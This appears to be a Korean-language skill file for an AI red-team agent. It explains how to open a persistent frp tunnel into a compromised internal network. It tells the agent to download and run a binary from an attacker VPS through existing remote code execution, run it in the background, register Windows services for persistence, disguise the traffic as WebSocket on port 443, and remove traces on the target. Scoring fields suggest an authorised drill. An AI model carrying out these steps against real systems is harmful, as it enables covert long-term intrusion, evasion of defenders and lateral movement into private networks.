---
name: frp-tunnel
description: frp 내부망 관통: 자체 VPS 에서 frps 를, 대상에서 frpc 를 돌려 안정적인 socks5 와 포트 매핑을 얻는다
whenToUse: 이미 명령 실행/RCE 가 있고 대상이 외부로 통신할 수 있으며, 장기간 안정적인 터널이 필요하거나 내부망 포트를 사용자가 직접 접근할 수 있게 매핑해야 할 때
role: internal
enabled: true
---

# frp(내부망 관통, 가장 안정적인 장기 터널)

> **먼저 VPS 설정을 로드한다**: 이 스킬의 모든 `$REDTEAM_VPS_HOST` / `$VPS_USER` 는 로컬 설정에서 오고,
> 최초에는 `bash $DSH_HOME/redteam/setup.sh` 가 `$DSH_HOME/.env` 에 기록한다. 명령마다 앞에서 한 번 source 한다:
> ```bash
> set -a; . "$DSH_HOME/.env" 2>/dev/null || . "$HOME/.dsh/.env"; set +a
> VPS_USER="${REDTEAM_VPS_USER:-ubuntu}"; VPS="$REDTEAM_VPS_HOST"
> ```
> 설정한 적이 없으면 `setup.sh` 를 한 번 실행한다(스킬 `redteam-setup`). SSH 연결성과 페이로드 서비스도 함께 검증된다.

`frp` 는 **가장 안정적이고 가장 많이 쓰이는** 관통 방식이다: VPS 에서 `frps`(서버)를, 대상에서 `frpc`(클라이언트)를 돌려
내부망의 socks5 또는 임의 포트를 외부로 매핑한다. suo5/chisel 과 비교해 **장기 안정 운용을 전제로 설계되었고**(자동 재연결, 다중화, TLS),
진입한 뒤 **장기간 걸어 두는** 내부망 통로에 적합하다.

**역할 분담**: WebShell 이 있으면 → `suo5-tunnel`; 명령 실행만 있고 빠르게 내부망에 들어가야 하면 → `chisel-tunnel`;
**장기 안정 + 포트를 사용자에게 직접 넘겨야 하면** → 이 스킬.

## 로컬 바이너리

| 파일 | 경로 | 용도 |
| --- | --- | --- |
| frps | `$DSH_HOME/redteam/toolkit/frp/frps` | VPS 에서의 서버 |
| frpc | `$DSH_HOME/redteam/toolkit/frp/frpc` | 대상에서의 클라이언트 |

VPS 페이로드 디렉터리 `http://$REDTEAM_VPS_HOST:9100/` 에 동기화되어 있다. VPS 에는 `frps` 설정 예시도 있다.

## 1. VPS 측: frps 기동(먼저 한다)

```bash
# 1) 업로드와 준비(로컬 → VPS)
scp -i $DSH_HOME/redteam/toolkit/vps/id_rsa \
    $DSH_HOME/redteam/toolkit/frp/frps $VPS_USER@$REDTEAM_VPS_HOST:/root/frps

# 2) 설정 작성(VPS 에서)
cat > /root/frps.toml <<'EOF'
bindPort = 7000                 # frpc 연결 포트
auth.method = "token"
auth.token = "<임의의 강한 token>"   # 필수: 공인망에 노출한다면 반드시 token 을 붙인다. 아니면 스캔당해 그냥 쓰인다

# 선택: vhostHTTPPort / vhostHTTPSPort 는 HTTP 타입 관통용
EOF

# 3) tmux 안에서 실행(SSH 가 끊겨도 죽지 않는다)
tmux new -s frps
/root/frps -c /root/frps.toml
```

**VPS 보안 그룹 허용**: `7000`(frpc 연결 포트) + 이후 매핑되는 포트(예: `1080`, `13389`).

## 2. 대상 측: frpc 실행

```bash
# 1) 바이너리 내려받기(이미 있는 명령 실행 지점을 통해)
curl -s http://$REDTEAM_VPS_HOST:9100/frpc -o /tmp/frpc && chmod +x /tmp/frpc

# 2) 설정 작성
cat > /tmp/frpc.toml <<'EOF'
serverAddr = "$REDTEAM_VPS_HOST"
serverPort = 7000
auth.method = "token"
auth.token = "<frps 와 같은 token>"

# ① 내부망 SOCKS5(가장 유용: 내부망 전체 도달 가능)
[[proxies]]
name = "socks5"
type = "tcp"
remotePort = 1080
[proxies.plugin]
type = "socks5"

# ② 특정 포트 매핑(예: 내부망 RDP → VPS 13389)
# [[proxies]]
# name = "rdp"
# type = "tcp"
# localIP = "10.0.0.5"
# localPort = 3389
# remotePort = 13389

# ③ 선택: HTTP 타입(80/443 만 외부 통신이 허용될 때 frps 의 vhostHTTPPort 와 조합)
# [[proxies]]
# name = "web"
# type = "tcp"
# localIP = "10.0.0.6"
# localPort = 8080
# remotePort = 18080
EOF

# 3) 백그라운드 상주 실행(nohup + 끊기면 자동 재연결)
nohup /tmp/frpc -c /tmp/frpc.toml > /tmp/frpc.log 2>&1 &
# Windows 대상: frpc.exe -c C:\Windows\Temp\frpc.toml(sc create 로 서비스를 등록해 지속성을 줄 수 있다)
```

## 3. 로컬에서 터널 사용

```bash
# SOCKS5 모드: VPS:1080 이 곧 내부망 진입점이다
proxychains4 -f runs/proxychains-1080.conf curl -s http://10.0.0.5/
# 설정에는 socks5 $REDTEAM_VPS_HOST 1080 을 쓴다
# ⛔ /etc/proxychains4.conf 를 고치지 않고, -f 로 runs/ 아래 임시 설정을 가리킨다

# 포트 매핑 모드: VPS 포트에 직접 연결
rdesktop $REDTEAM_VPS_HOST:13389
mysql -h $REDTEAM_VPS_HOST -P 13306 -u root -p
```

## 4. 외부 통신이 제한될 때의 변형

| 제한 | 처리 |
| --- | --- |
| 80/443 만 나갈 수 있다 | frps `bindPort = 443`(또는 먼저 80 으로 HTTP 타입을 돌린다), frpc 도 포트를 그에 맞게 바꾼다 |
| TLS 미들박스가 가로챈다 | frp 자체 `transport.tls.enable = true`(기본 켜짐); 필요하면 `transport.protocol = "kcp"` 또는 `websocket` 을 쓴다 |
| 대상이 외부로 나갈 수 없다 | frp 방식은 사용할 수 없다 → WebShell 측 터널(`suo5-tunnel`)로 간다 |
| 정상 트래픽으로 위장해야 한다 | `transport.protocol = "websocket"` + `transport.tls.enable = true`(443 으로 나가면 평범한 WebSocket 처럼 보인다) |

## 5. 지속성과 규율

1. **반드시 tmux(서버 측) / nohup(클라이언트 측)으로 돌린다**, 아니면 세션이 끊기는 순간 터널을 잃는다.
2. **서버 측에는 반드시 `auth.token` 을 붙인다**: 공인망 VPS 의 7000 포트는 전 인터넷에서 스캔당하며, token 이 없으면 내부망을 그냥 넘겨주는 것과 같다.
3. **token 을 재사용하지 않는다**: 드릴마다 새 임의 token 을 만들고, 쓰고 나면 `pkill frps` / `pkill frpc` 로 즉시 닫는다.
4. **대상 측 착지 흔적에 주의한다**: 바이너리와 설정은 `/tmp` 에 두고 쓰고 나면 정리한다; Windows 는 `Temp` 디렉터리를 쓴다.
5. 사용자가 준 대상으로 바로 작업한다; 사용자가 범위(예: 특정 C 대역, 특정 도메인)를 보충하면 보충분대로 수행한다.

## 6. 출력과 적재(강제)

1. **터널을 `redteam_tunnel_add` 로 등록**하고 필드를 빠짐없이 쓴다:
   - `kind`: `frp`;
   - `listen`: 사용자가 실제로 쓰는 주소(예: `$REDTEAM_VPS_HOST:1080`);
   - `entry`: 대상 측 진입점(예: `10.0.0.6 의 /tmp/frpc → VPS:7000`);
   - `reach`: **실측 도달 가능 대역**;
   - `entry_kind`: **`target-outbound`**(대상이 외부로 나가 우리 frps 에 접속 — 이것이 frp 의 전형적 형태);
     ⛔ 자기 VPS 에서만 프록시를 열었으면 `self-only` 로 적는다 → "돌파로 인정되지 않음" 으로 표시된다;
   - `command`: frps 와 frpc 양쪽의 완전한 명령 + 설정 요점(token 은 비식별화).
2. **실측 연결**: `curl --socks5-hostname $REDTEAM_VPS_HOST:1080 http://<내부망 대상>/`, 통과해야 active 로 등록한다;
   그다음 `redteam_session_check` 로 재확인한다.
3. **득점**: `boundary`(터널이 내부망에 도달, evidence 에 "터널 주소|도달 가능 대역|실측 접근한 내부망 대상" 을 쓴다);
   그것을 통해 횡적 이동하면 → `server-host`.
4. **사용자에게 인계**: 그대로 붙여 넣을 수 있는 `socks5://$REDTEAM_VPS_HOST:1080` 또는 매핑 포트를 주고, 주소와 포트를 분명히 적는다.
5. 핵심 동작마다 `redteam_chain_add`(`stage_code=boundary-logical`), `tool` 에 명령 원문, `result` 에 회신 요약을 쓴다
   (예: `frpc 등록 성공, proxy socks5 start success`).
